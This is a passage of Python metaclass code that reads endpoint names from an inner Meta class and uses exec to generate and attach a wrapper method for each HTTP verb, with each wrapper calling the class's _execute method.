            verbs = [x for x, y in class_dict['Meta'].__dict__.items() if
                     type(y) == str and not x.startswith(
                         "__")]
            # dynamically extracts the HTTP endpoints defined
            # in the inner Meta class.

            method_definition = """
def _{0}(self, **params):
    return self._execute('{0}', params)
            """  # for each endpoint define a wrapper method
            # called _{verb_name}. This method will be passed the
            # parameters to be sent in the HTTP query.
            for verb in verbs:
                supported_verb = method_definition.format(verb)
                exec (supported_verb)  # create the method.
                setattr(new_class, verb, locals()[
                    "_" + verb])  # attach the method to the class object.

        return new_class 
